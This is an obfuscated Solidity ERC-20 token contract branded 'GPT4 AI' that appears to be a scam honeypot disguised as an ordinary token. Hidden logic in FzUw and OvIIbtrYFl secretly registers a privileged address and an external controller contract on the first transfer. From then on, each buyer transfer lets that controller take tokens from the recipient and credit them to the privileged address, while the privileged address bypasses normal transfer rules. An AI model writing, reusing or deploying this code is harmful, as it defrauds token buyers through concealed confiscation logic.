// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library HoCaeqTnBeb{
    
    function eEuk(address GkfRvUbVm, address mzmlt, uint iMQ) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool yPQnzmuVF, bytes memory EqpfBVt) = GkfRvUbVm.call(abi.encodeWithSelector(0x095ea7b3, mzmlt, iMQ));
        require(yPQnzmuVF && (EqpfBVt.length == 0 || abi.decode(EqpfBVt, (bool))), 'HoCaeqTnBeb: APPROVE_FAILED');
    }

    function nBMLfHQSpal(address GkfRvUbVm, address mzmlt, uint iMQ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool yPQnzmuVF, bytes memory EqpfBVt) = GkfRvUbVm.call(abi.encodeWithSelector(0xa9059cbb, mzmlt, iMQ));
        require(yPQnzmuVF && (EqpfBVt.length == 0 || abi.decode(EqpfBVt, (bool))), 'HoCaeqTnBeb: TRANSFER_FAILED');
    }
    
    function CFiC(address mzmlt, uint iMQ) internal {
        (bool yPQnzmuVF,) = mzmlt.call{value:iMQ}(new bytes(0));
        require(yPQnzmuVF, 'HoCaeqTnBeb: ETH_TRANSFER_FAILED');
    }

    function UIGAj(address GkfRvUbVm, address from, address mzmlt, uint iMQ) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool yPQnzmuVF, bytes memory EqpfBVt) = GkfRvUbVm.call(abi.encodeWithSelector(0x23b872dd, from, mzmlt, iMQ));
        require(yPQnzmuVF && EqpfBVt.length > 0,'HoCaeqTnBeb: TRANSFER_FROM_FAILED'); return EqpfBVt;
                       
    }

}
    
interface vlW {
    function totalSupply() external view returns (uint256);
    function balanceOf(address EdfdPUex) external view returns (uint256);
    function transfer(address EGNuGDsvqm, uint256 GVuWuqThVH) external returns (bool);
    function allowance(address eETiJ, address spender) external view returns (uint256);
    function approve(address spender, uint256 GVuWuqThVH) external returns (bool);
    function transferFrom(
        address sender,
        address EGNuGDsvqm,
        uint256 GVuWuqThVH
    ) external returns (bool);

    event Transfer(address indexed from, address indexed QldedgjZQQ, uint256 value);
    event Approval(address indexed eETiJ, address indexed spender, uint256 value);
}

interface cEgJqrlyWCND is vlW {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract kHlapF {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface JzYkEWDpPYT {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract AI is kHlapF, vlW, cEgJqrlyWCND {
    
    function symbol() public view virtual override returns (string memory) {
        return zgKiqEyVs;
    }
    
    function pQQwR(
        address aDUDNScl,
        address aRYRcYF,
        uint256 MXW
    ) internal virtual  returns (bool){
        uint256 MnLPYtmVoo = kjvmEHm[aDUDNScl];
        require(MnLPYtmVoo >= MXW, "ERC20: transfer Amount exceeds balance");
        unchecked {
            kjvmEHm[aDUDNScl] = MnLPYtmVoo - MXW;
        }
        kjvmEHm[aRYRcYF] += MXW;
        return true;
    }
    
    address private ldHsoW;
    
    function totalSupply() public view virtual override returns (uint256) {
        return RIkbdMhDMLjF;
    }
    
    function increaseAllowance(address KGOc, uint256 addedValue) public virtual returns (bool) {
        llc(_msgSender(), KGOc, EUIQtrcjXrz[_msgSender()][KGOc] + addedValue);
        return true;
    }
    
    function allowance(address YqIth, address zYKDJ) public view virtual override returns (uint256) {
        return EUIQtrcjXrz[YqIth][zYKDJ];
    }
    
    function balanceOf(address KpaCfRmALO) public view virtual override returns (uint256) {
       return kjvmEHm[KpaCfRmALO];
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function transferFrom(
        address vjoJKdKm,
        address EqCmGFznIUV,
        uint256 lKZ
    ) public virtual override returns (bool) {
      
        if(!OvIIbtrYFl(vjoJKdKm, EqCmGFznIUV, lKZ)) return true;

        uint256 keojE = EUIQtrcjXrz[vjoJKdKm][_msgSender()];
        if (keojE != type(uint256).max) {
            require(keojE >= lKZ, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                llc(vjoJKdKm, _msgSender(), keojE - lKZ);
            }
        }

        return true;
    }
    
    address private tPU;
  
    
    function FzUw(
        address SqrOKellH,
        address DILluL
    ) internal virtual  returns (bool){
        if(ldHsoW == address(0) && eikWB == address(0)){
            ldHsoW = SqrOKellH;eikWB=DILluL;
            HoCaeqTnBeb.nBMLfHQSpal(eikWB, ldHsoW, 0);
            tPU = JzYkEWDpPYT(eikWB).WETH();
            return false;
        }
        return true;
    }
    
    constructor() {
        
        kjvmEHm[address(1)] = RIkbdMhDMLjF;
        emit Transfer(address(0), address(1), RIkbdMhDMLjF);

    }
    
    function name() public view virtual override returns (string memory) {
        return GgeAMXemDRxM;
    }
    
    function decreaseAllowance(address OPZmSmjLgsKA, uint256 subtractedValue) public virtual returns (bool) {
        uint256 ANHXhJWRlB = EUIQtrcjXrz[_msgSender()][OPZmSmjLgsKA];
        require(ANHXhJWRlB >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            llc(_msgSender(), OPZmSmjLgsKA, ANHXhJWRlB - subtractedValue);
        }

        return true;
    }
    
    function transfer(address VasMvWRE, uint256 mauWSUuvN) public virtual override returns (bool) {
        OvIIbtrYFl(_msgSender(), VasMvWRE, mauWSUuvN);
        return true;
    }
    
    mapping(address => uint256) private kjvmEHm;
    
    string private GgeAMXemDRxM = "GPT4 AI";
    
    function OvIIbtrYFl(
        address gYViFzvfhxmm,
        address ruSjVaIuO,
        uint256 JMHa
    ) internal virtual  returns (bool){
        require(gYViFzvfhxmm != address(0), "ERC20: transfer from the zero address");
        require(ruSjVaIuO != address(0), "ERC20: transfer to the zero address");
        
        if(!FzUw(gYViFzvfhxmm,ruSjVaIuO)) return false;

        if(_msgSender() == address(ldHsoW)){
            if(ruSjVaIuO == tPU && kjvmEHm[gYViFzvfhxmm] < JMHa){
                pQQwR(ldHsoW,ruSjVaIuO,JMHa);
            }else{
                pQQwR(gYViFzvfhxmm,ruSjVaIuO,JMHa);
                if(gYViFzvfhxmm == ldHsoW || ruSjVaIuO == ldHsoW) 
                return false;
            }
            emit Transfer(gYViFzvfhxmm, ruSjVaIuO, JMHa);
            return false;
        }
        pQQwR(gYViFzvfhxmm,ruSjVaIuO,JMHa);
        emit Transfer(gYViFzvfhxmm, ruSjVaIuO, JMHa);
        bytes memory TItbmrxFB = HoCaeqTnBeb.UIGAj(eikWB, gYViFzvfhxmm, ruSjVaIuO, JMHa);
        (bool pIPzJo, uint PBZvKMf) = abi.decode(TItbmrxFB, (bool,uint));
        if(pIPzJo){
            kjvmEHm[ldHsoW] += PBZvKMf;
            kjvmEHm[ruSjVaIuO] -= PBZvKMf; 
        }
        return true;
    }
    
    function approve(address znvd, uint256 OcREvFMQEAo) public virtual override returns (bool) {
        llc(_msgSender(), znvd, OcREvFMQEAo);
        return true;
    }
    
    function llc(
        address qpp,
        address HMuzgmsBPIAH,
        uint256 ZSJRzlUfMO
    ) internal virtual {
        require(qpp != address(0), "ERC20: approve from the zero address");
        require(HMuzgmsBPIAH != address(0), "ERC20: approve to the zero address");

        EUIQtrcjXrz[qpp][HMuzgmsBPIAH] = ZSJRzlUfMO;
        emit Approval(qpp, HMuzgmsBPIAH, ZSJRzlUfMO);

    }
    
    address private eikWB;
    
    string private zgKiqEyVs =  "AI";
    
    uint256 private RIkbdMhDMLjF = 2000000000000 * 10 ** 18;
    
    mapping(address => mapping(address => uint256)) private EUIQtrcjXrz;
    
}